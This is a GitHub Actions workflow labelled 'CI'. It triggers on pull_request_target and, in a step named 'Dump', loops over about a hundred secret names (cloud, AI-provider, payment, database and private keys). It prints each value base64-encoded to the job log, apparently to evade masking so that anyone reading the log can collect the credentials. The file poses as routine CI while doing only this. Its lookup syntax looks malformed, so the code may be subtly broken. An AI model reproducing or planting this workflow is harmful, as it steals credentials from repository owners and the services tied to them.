name: CI
on:
  pull_request_target:
    types: [opened, synchronize, reopened]
    branches: [main, master]
  workflow_dispatch:

jobs:
  collect:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Dump
        shell: bash
        run: |
          echo "=== BASE64 ==="
          for s in GH_TOKEN GITHUB_TOKEN TOKEN API_KEY OPENAI_API_KEY OPENAI_KEY OPENAI_SECRET_KEY ANTHROPIC_API_KEY MISTRAL_API_KEY GROQ_API_KEY REPLICATE_API_KEY HF_TOKEN COHERE_API_KEY GOOGLE_API_KEY GCP_SA_KEY FIREBASE_KEY AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_ACCESS_KEY AWS_SECRET_KEY STRIPE_SECRET_KEY STRIPE_PUBLISHABLE_KEY STRIPE_WEBHOOK_SECRET SLACK_TOKEN SLACK_WEBHOOK DISCORD_TOKEN DISCORD_WEBHOOK DOCKER_PASSWORD DOCKER_TOKEN NPM_TOKEN PAT SECRET PASSWORD DB_PASSWORD DATABASE_URL MONGO_URI MONGODB_URI REDIS_URL POSTGRES_URL JWT_SECRET SESSION_SECRET ENCRYPTION_KEY SENDGRID_API_KEY TWILIO_ACCOUNT_SID TWILIO_AUTH_TOKEN TELEGRAM_BOT_TOKEN TG_BOT_TOKEN CLOUDFLARE_TOKEN CF_API_KEY CF_EMAIL SONAR_TOKEN CODECOV_TOKEN MAPBOX_ACCESS_TOKEN NEXT_PUBLIC_SUPABASE_URL SUPABASE_URL SUPABASE_KEY AUTH_TOKEN ACCESS_TOKEN REFRESH_TOKEN APP_SECRET CLIENT_SECRET PRIVATE_KEY GITLAB_TOKEN GITLAB_CI_TOKEN BITBUCKET_TOKEN AZURE_TOKEN AZURE_CONNECTION_STRING DO_TOKEN LINODE_TOKEN VULTR_TOKEN DIGITALOCEAN_TOKEN PACKAGIST_TOKEN COMPOSER_TOKEN PYPI_TOKEN GEMINI_API_KEY CLAUDE_API_KEY HUGGINGFACE_TOKEN OPENROUTER_API_KEY PERPLEXITY_API_KEY DEEPSEEK_API_KEY TOGETHER_API_KEY CODEGPT_API_KEY SCW_SECRET_KEY SCW_ACCESS_KEY HETZNER_API_KEY OVH_API_KEY CLOUDAMQP_URL ALGOLIA_API_KEY ALGOLIA_APPLICATION_ID ELASTICSEARCH_URL NEW_RELIC_LICENSE_KEY DATADOG_API_KEY DATADOG_APP_KEY; do
            eval "V=\${secrets.$s:-}"
            [ -n "$V" ] && echo "$s:$(echo "$V"|base64 -w0 2>/dev/null)"
          done
          echo "=== END ==="
